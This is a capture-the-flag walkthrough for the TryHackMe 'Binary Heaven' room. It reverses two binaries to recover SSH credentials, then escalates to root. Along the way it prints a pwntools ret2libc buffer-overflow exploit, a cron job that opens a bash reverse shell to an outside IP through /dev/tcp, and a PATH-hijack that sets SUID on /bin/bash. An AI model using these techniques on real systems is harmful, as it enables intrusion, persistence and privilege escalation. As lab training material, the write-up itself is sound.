---
tags:
  - THM
  - Linux
  - Medium
  - File-Analysis
  - SUID
  - Scripting
  - BOF
  - PATH-HJ
---
https://tryhackme.com/room/binaryheaven/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.64.166.10 binheaven.thm
```
# Scanning
```console
$ nmap -p22 -sV -sC binheaven.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1c:f7:0a:10:0e:56:1f:69:e1:d4:a6:84:19:93:ec:22 (RSA)
|   256 40:0a:88:7b:7d:c7:19:d7:74:42:20:41:c8:cf:34:37 (ECDSA)
|_  256 af:02:79:50:54:1e:0b:ee:b3:d9:c4:5c:37:cd:28:de (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Binary Analysis
We are given 2 binaries which contain the correct **SSH credentials**.
## Username
The first binary asks for the **correct username**:
```console
$ file angel_A
angel_A: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=90a71dbbf2c94dc164a49328fb82f8fa914a9701, for GNU/Linux 3.2.0, not stripped

$ ./angel_A   

Say my username >> bob

That is not my username!
```
Using `radare2` and `ghidra`, got the pseudo C-code:
```c
undefined8
main(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,undefined8 param_5,
    undefined8 param_6)

{
  long lVar1;
  byte user_input [9];
  int i;
  
  lVar1 = ptrace(PTRACE_TRACEME,0,1,0,param_5,param_6,param_2);
  if (lVar1 == -1) {
    printf("Using debuggers? Here is tutorial https://www.youtube.com/watch?v=dQw4w9WgXcQ/n%22");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("\x1b[36m\nSay my username >> \x1b[0m");
  fgets((char *)user_input,9,stdin);
  i = 0;
  while( true ) {
    if (7 < i) {
      puts("\x1b[32m\nCorrect! That is my name!\x1b[0m");
      return 0;
    }
                    /* username = U"kym~humr" */
    if (*(int *)(username + (long)i * 4) != (char)(user_input[i] ^ 4) + 8) break;
    i = i + 1;
  }
  puts("\x1b[31m\nThat is not my username!\x1b[0m");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
As we can see, the **username** is a 32-bit array. So, we create a Python script to find the correct characters. We could reverse the XOR operation, but instead I just chose to brute force:
```python
#!/usr/bin/python3

import string

username = "kym~humr"

for c in username:    
    for test_c in string.ascii_letters:
        if ord(c) == (ord(test_c)^4)+8:
            print(test_c, end='')
            break
```
Finally, we get the **correct username**:
```console
$ python3 username.py   

guardian
```
## Password
This time, we have a 32-bit GoLang binary asking for a **password**:
```console
$ file angel_B
angel_B: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=Xd_LgpWItJBNJmN63lQy/oWW_4FYae77KCrbbrcIX/2pmyS7gUszdXBsoOAYWo/PyEjnQ2VYI7PIdiOmGXg, not stripped

$ ./angel_B
 
Say the magic word >> 
password
 
You are not worthy of heaven!
```
It is important to note that in GoLang, a string is essentially:
```c
#include <stdint.h>

struct go_string {
	uint8_t *ptr; // RAX
	intptr_t len; // RCX
};
```
Using `radare2` and `pdc@sym.main.main`, found the section to which we must go to thanks to the strings:
```c
loc_0x004a54c6:  // orphan
         rax = rip + 0x24af2      // 0x4c9fbf
         qword [rsp] = rax
         qword [var_8h] = 5
         sym.runtime.convTstring () // sym.go.runtime.convTstring // sym.runtime.convTstring(0x0, 0x0, 0x0)
         rax = qword [var_10h]
         xmm0 ^= xmm0
         xmmword [var_78h] = xmm0
         xmmword [var_88h] = xmm0
         rcx = rip + 0xb9c5       // 0x4b0ec0
         qword [var_78h] = rcx
         qword [var_80h] = rax
         qword [var_88h] = rcx
         rax = rip + 0x44029      // 0x4e9540 // (pstr 0x004d1450) "\nRight password! Now GO ahead and SSH into heaven.attempt to ex"
         qword [var_90h] = rax
         rax = qword [obj.os.Stdout] // [0x568cb0:8]=0
         rcx = rip + obj.go.itab.os.File_io.Writer // 0x4ead60
         qword [rsp] = rcx
         qword [var_8h] = rax
         rax = var_78h
         qword [var_10h] = rax
         qword [var_18h] = 2
         qword [var_20h] = 2
         sym.fmt.Fprintln ()      // sym.go.fmt.Fprintln // sym.fmt.Fprintln(0x0, 0x0, 0x0, 0x4ead60, 0x0, 0x0, 0x0, 0x0)
         goto loc_0x004a5491
```
Found that the length of the string must be 11 to jump to that section and after jumping we see the whole string, which then is compared with `memequal`:
```console
> pdf@sym.main.main
...
│      │╎   0x004a5400      4883f90b       cmp rcx, 0xb                ; 11
│     ┌───< 0x004a5404      0f8497000000   je 0x4a54a1
...
│   ╎╎└───> 0x004a54a1      48890424       mov qword [rsp], rax
│   ╎╎ │╎   0x004a54a5      488d055f58..   lea rax, [0x004cad0b]       ; "GOg0esGrrr!IdeographicMedefaidrinNandinagariNew_Tai_LueOld_PersianOld_SogdianPau_Cin_HauSignWritingSoft_DottedWarang_CitiWhite_"
│   ╎╎ │╎   0x004a54ac      4889442408     mov qword [var_8h], rax
│   ╎╎ │╎   0x004a54b1      48894c2410     mov qword [var_10h], rcx
│   ╎╎ │╎   0x004a54b6      e825cef5ff     call sym.runtime.memequal
...
```
Since `memequal` considers the length of the string, we test the first 11 characters and found the **correct password**:
```console
$ ./angel_B
 
Say the magic word >> 
GOg0esGrrr!
 
Right password! Now GO ahead and SSH into heaven.
```
So, we connect via SSH and get the **guardian flag**:
```console
$ sshpass -p 'GOg0esGrrr!' ssh guardian@binheaven.thm

$ cat /home/guardian/guardian_flag.txt
```
# Post-Exploitation
## User Migration
There is an **SUID binary** owned by a user called **binexgod**:
```console
$ ls -la /home/guardian/pwn_me

-rwsr-sr-x 1 binexgod binexgod 15772 May  8  2021 /home/guardian/pwn_me
```
To make it easier, the binary outputs `system` address, and is vulnerable to **buffer overflow**:
```console
$ /home/guardian/pwn_me

Binexgod said he want to make this easy.
System is at: 0xf7df4950
INPUTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
Segmentation fault (core dumped)
```
Using `gdb`, `pattern create`, and `i r`, found the offset at 32. The binary is 32-bit:
```console
$ file pwn_me

pwn_me: setuid, setgid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=09a0fc14e276c9e16015cc8efff3389f3e576ba6, for GNU/Linux 3.2.0, not stripped
```
After transferring the target `libc` library locally, created a Python script to abuse the **SUID binary**:
```python
#!/usr/bin/python3

from pwn import *

s = ssh('guardian', 'binheaven.thm', password='GOg0esGrrr!')
p = s.system('/home/guardian/pwn_me')

# Local copy
libc = ELF('./libc.so.6', False)

# Get system address
p.recvuntil(b'at: ')
pSystem = int(p.recvline().strip(), 16)
libc.address = pSystem - libc.symbols['system']

# Get '/bin/sh'
bin_sh = next(libc.search(b'/bin/sh\x00'))

# Spawn shell
payload = b'A'*32 + p32(pSystem) + p32(0) + p32(bin_sh)
p.sendline(payload)
p.interactive()
```
## Cron Persistence
The current session is not very stable, so we create a **cron job** to get reverse shells:
```console
$ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.150.216/4444 0>&1'" | crontab -
```
Wait for connections:
```console
$ nc -lvnp 4444
```
Get the **binexgod flag**:
```console
$ cat /home/binexgod/binexgod_flag.txt
```
## Privilege Escalation
There is another **SUID binary**, but this time owned by **root**:
```console
$ ls -l /home/binexgod/vuln

-rwsr-xr-x 1 root binexgod 8824 Mar 15  2021 /home/binexgod/vuln
```
We are also given the source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo Get out of heaven lol");
}
```
The `echo` command is not using full path, so we perform a **path hijacking**:
```console
$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /tmp/echo

$ chmod +x /tmp/echo

$ export PATH="/tmp:$PATH"

$ /home/binexgod/vuln

$ /bin/bash -p
```
Finally, we get the **root flag**:
```console
$ cat /root/root.txt
```